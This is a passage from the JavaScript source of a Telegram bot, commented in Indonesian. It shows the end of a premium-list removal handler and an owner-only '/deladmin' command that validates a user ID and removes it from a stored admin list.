    `✅ User ${userId} has been removed from the premium list.`
  );
});

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
  if (!isOwner(senderId)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  // Pengecekan input dari pengguna
  if (!match || !match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please provide a user ID. Example: /deladmin 7579095053."
    );
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ""));
  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. Example: /deladmin 7579095053."
    );
  }

  // Cari dan hapus user dari adminUsers
  const adminIndex = adminUsers.indexOf(userId);
  if (adminIndex !== -1) {
    adminUsers.splice(adminIndex, 1);
    saveAdminUsers();
    console.log(`${senderId} Removed ${userId} From Admin`);
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
  } else {
    bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
  }
});
